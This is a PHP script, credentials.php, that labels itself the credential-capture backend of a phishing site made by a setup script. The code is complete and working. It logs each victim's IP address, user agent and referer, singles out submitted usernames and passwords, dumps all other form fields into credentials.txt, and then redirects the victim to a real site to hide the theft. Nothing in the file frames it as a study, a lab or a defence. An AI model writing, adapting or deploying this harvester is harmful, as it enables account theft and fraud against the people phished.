<?php
// credentials.php - Script to capture phishing credentials
// This file is created by host_phishing_site.sh

// Set error reporting to capture all errors but not display them
error_reporting(E_ALL);
ini_set('display_errors', 0);

// Function to get the visitor's IP address
function getIP() {
    $ip = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ip = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ip = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ip = $_SERVER['REMOTE_ADDR'];
    else
        $ip = 'Unknown';
    return $ip;
}

// Initialize variables
$log_file = "credentials.txt";
$date = date('Y-m-d H:i:s');
$ip = getIP();
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access';

// Read the redirect URL from the file or use a default
$redirect_url = "https://www.google.com"; // Default fallback
if (file_exists('redirect_url.txt')) {
    $redirect_url = trim(file_get_contents('redirect_url.txt'));
}

// Create log entry header
$log_entry = "==== CREDENTIALS CAPTURED AT $date ====\n";
$log_entry .= "IP Address: $ip\n";
$log_entry .= "User Agent: $user_agent\n";
$log_entry .= "Referer: $referer\n";
$log_entry .= "Form Data:\n";

// Capture all POST data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Look for common username/email field names
    $username_fields = ['username', 'user', 'email', 'login', 'name', 'account', 'emailaddress', 'userid'];
    $password_fields = ['password', 'pass', 'pwd', 'passwd'];
    
    $found_username = false;
    $found_password = false;
    
    // Process each POST field
    foreach ($_POST as $key => $value) {
        // Try to identify username/email fields
        $key_lower = strtolower($key);
        
        if (!$found_username && (in_array($key_lower, $username_fields) || strpos($key_lower, 'user') !== false || strpos($key_lower, 'email') !== false || strpos($key_lower, 'login') !== false)) {
            $log_entry .= "USERNAME/EMAIL: $value (Field: $key)\n";
            $found_username = true;
        } 
        else if (!$found_password && (in_array($key_lower, $password_fields) || strpos($key_lower, 'pass') !== false || strpos($key_lower, 'pwd') !== false)) {
            $log_entry .= "PASSWORD: $value (Field: $key)\n";
            $found_password = true;
        } 
        else {
            // Log other fields
            $log_entry .= "$key: $value\n";
        }
    }
    
    // If we couldn't identify username/password fields, log a complete dump
    if (!$found_username || !$found_password) {
        $log_entry .= "\nCOMPLETE FORM DATA DUMP:\n";
        foreach ($_POST as $key => $value) {
            $log_entry .= "$key: $value\n";
        }
    }
} else {
    $log_entry .= "No POST data received\n";
}

$log_entry .= "==== END OF ENTRY ====\n\n";

// Write to log file
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Redirect to legitimate site
header("Location: $redirect_url");
exit;
?> 